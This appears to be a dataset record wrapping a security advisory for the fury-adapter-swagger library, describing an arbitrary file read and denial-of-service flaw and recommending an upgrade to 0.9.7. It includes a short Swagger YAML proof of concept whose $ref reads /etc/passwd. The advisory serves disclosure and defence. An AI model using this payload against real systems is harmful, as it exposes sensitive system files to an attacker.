{"description": "`fury-adapter-swagger` from version 0.2.0 until version 0.9.7 has a weakness that allows an attacker to read arbitrary files off of the system. This can be used to read sensitive data, or to cause a denial of service condition by attempting to read something like `/dev/zero`.\n\n## Proof of Concept:\n\n```yaml\n---\nswagger: '2.0'\ninfo:\n  title: Read local files\n  version: '1.0'\n\npaths:\n  /foo:\n    get:\n      responses:\n        200:\n          description: Some description\n          examples:\n            text/html:\n              example:\n                $ref: '/etc/passwd'\n```\n\n\n## Recommendation\n\nUpgrade to version 0.9.7 or later.", "methods": ["Used a weakness in the `fury-adapter-swagger` library to read arbitrary files from the system.", "Used a YAML file to specify a file path to read, such as `/etc/passwd`."]}
